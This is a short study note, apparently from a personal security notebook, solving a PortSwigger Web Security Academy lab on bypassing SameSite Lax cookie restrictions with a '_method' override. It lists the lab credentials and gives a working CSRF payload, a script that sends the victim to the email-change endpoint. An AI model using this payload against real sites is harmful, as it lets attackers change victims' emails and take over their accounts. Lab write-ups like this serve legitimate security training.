---
tags:
  - PRACTITIONER
  - Lax
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
---

# `SameSite` Lax bypass via method override
---

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - satisfied

- **`SameSite` Lax bypass**
	1. **Study the change email function**
		- Doesn't contain any unpredictable tokens
		- The website doesn't explicitly specifies `SameSite` restrictions when setting session cookies
	2. **Bypass the `SameSite` restrictions**
		- Change request method
		- Overriding the method by adding the `_method` parameter to the query string
			```html
			GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
			```
	3. Craft an exploit
		```html
		<script>
		
			document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned%40normal-user.net&_method=POST"
		
		</script>
		```


